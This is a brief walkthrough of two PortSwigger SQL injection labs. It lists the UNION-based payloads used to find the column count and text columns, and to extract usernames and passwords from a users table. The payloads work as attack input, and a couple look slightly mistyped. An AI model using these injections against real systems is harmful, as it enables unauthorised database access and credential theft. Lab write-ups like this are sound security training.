# SQL Injection Part 2

## Portswigger Labs
### [Lab 4: SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

**To solve: Find column containing text and print gDi73c**

**STEP 1:**
Find number of colums
```html
'+UNION+SELECT+NULL,NULL,NULL--
```

**STEP 2:**
Find columns that contains text
```html
'+UNION+SELECT+NULL,'abcd',NULL--
```

**STEP 3:**
Print the text 'gDi73c'
```html
'+UNION+SELECT+null,+'gDi73c',+null--
```

### [Lab5: SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

**To solve: Login as administrator**

**STEP 1:**
Find number of column returned
```html
'+UNION+SELECT+NULL,NULL--
```

**STEP 2:**
Find column that contains text
```html
'+UNION+SELECT+abcd,'abcd'--
```

**STEP 3:**
Return username and password from users table
```html
+UNION+SELECT+username,+password+FROM+users--
```
